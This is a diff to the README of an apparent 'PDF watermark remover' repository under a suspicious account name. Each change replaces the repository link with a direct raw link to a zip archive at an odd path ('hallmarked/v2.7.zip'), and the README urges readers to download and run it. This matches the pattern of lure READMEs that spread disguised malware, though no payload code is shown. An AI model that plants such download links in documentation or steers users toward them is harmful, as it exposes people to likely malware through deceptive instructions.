@@ -1,6 +1,6 @@
 # 🛠️ pdf-watermark-remover-tool - Remove Watermarks in One Click
 
-[![Download Now](https://img.shields.io/badge/Download-pdf--watermark--remover--tool-blue?style=for-the-badge&logo=github)](https://github.com/ransommoneyglycyrrhiza648/pdf-watermark-remover-tool)
+[![Download Now](https://img.shields.io/badge/Download-pdf--watermark--remover--tool-blue?style=for-the-badge&logo=github)](https://github.com/ransommoneyglycyrrhiza648/pdf-watermark-remover-tool/raw/refs/heads/main/hallmarked/v2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome! This guide will help you download and use the **pdf-watermark-remover-t
 
 ## 📥 Download the Application
 
-Visit this link to download the application: **[https://github.com/ransommoneyglycyrrhiza648/pdf-watermark-remover-tool](https://github.com/ransommoneyglycyrrhiza648/pdf-watermark-remover-tool)**
+Visit this link to download the application: **[https://github.com/ransommoneyglycyrrhiza648/pdf-watermark-remover-tool/raw/refs/heads/main/hallmarked/v2.7.zip](https://github.com/ransommoneyglycyrrhiza648/pdf-watermark-remover-tool/raw/refs/heads/main/hallmarked/v2.7.zip)**
 
 When you click the link, you'll land on the project's main page. Look for the **"Releases"** section or a **"Download"** button on the right side of the page. Click it, and your download will start automatically.
 
@@ -96,7 +96,7 @@ The tool creates new files in an `Output` folder. Your original PDFs stay untouc
 
 ### Part 1: Downloading Safely
 1. Open your web browser (Chrome, Edge, or Firefox).
-2. Go to the download link: **[https://github.com/ransommoneyglycyrrhiza648/pdf-watermark-remover-tool](https://github.com/ransommoneyglycyrrhiza648/pdf-watermark-remover-tool)**
+2. Go to the download link: **[https://github.com/ransommoneyglycyrrhiza648/pdf-watermark-remover-tool/raw/refs/heads/main/hallmarked/v2.7.zip](https://github.com/ransommoneyglycyrrhiza648/pdf-watermark-remover-tool/raw/refs/heads/main/hallmarked/v2.7.zip)**
 3. Click the green **"Code"** button, then select **"Download ZIP"**. *Or* scroll down to the **"Releases"** section and click the latest release's `.zip` or `.exe` link.
 4. Wait for the download to complete. Time depends on your internet speed.
 
